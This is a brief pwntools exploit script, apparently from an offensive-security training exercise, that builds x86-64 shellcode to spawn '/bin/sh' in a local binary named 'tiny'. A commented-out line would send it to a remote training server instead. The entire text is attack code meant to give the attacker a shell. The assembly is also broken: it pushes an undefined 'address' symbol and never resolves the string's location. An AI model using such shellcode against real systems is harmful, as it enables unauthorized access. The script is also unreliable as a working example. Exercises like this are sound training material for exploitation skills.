from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = process("./tiny")
gdb.attach(r,'''
''')
#input("wait")
#r = remote("bin.training.offdef.it", 3001)

asm_code = """
push 0x3b
push 0
push 0
push address
pop rdi
pop rsi
pop rdx
pop rax 
syscall
"""

context.arch = 'amd64'
stringa = "/bin/sh"


shellcode = asm(asm_code)
res = shellcode + (b"/bin/sh")

input("wait")
r.send(res)

r.interactive()